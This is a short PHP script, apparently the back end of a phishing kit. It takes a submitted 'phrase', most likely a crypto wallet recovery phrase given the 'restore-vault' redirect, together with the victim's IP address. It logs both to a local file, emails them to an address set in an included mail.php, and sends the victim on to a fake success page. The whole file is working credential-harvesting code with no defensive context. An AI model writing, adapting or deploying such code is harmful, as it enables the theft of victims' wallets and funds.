<?php
$file = "mrcink";
$phrase = $_POST['phrase'];
$ip = $_SERVER['REMOTE_ADDR'];

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "phrase   	: ");
fwrite($handle, "$phrase");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "https://complate.com ");
fwrite($handle, "\n");
fclose($handle);
$phrase = $_POST['phrase'];
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

phrase : ".$phrase." 

IP Address : https://geoiptool.com/?IP=".$ip." 

https://complate.com/
";
include "mail.php";
$subject = "============ complate ============ ".$ip." ";
mail($rezult_mail, $subject, $message, $headers);
echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"succcesss.html#restore-vault\";
// -->
</script>";
?>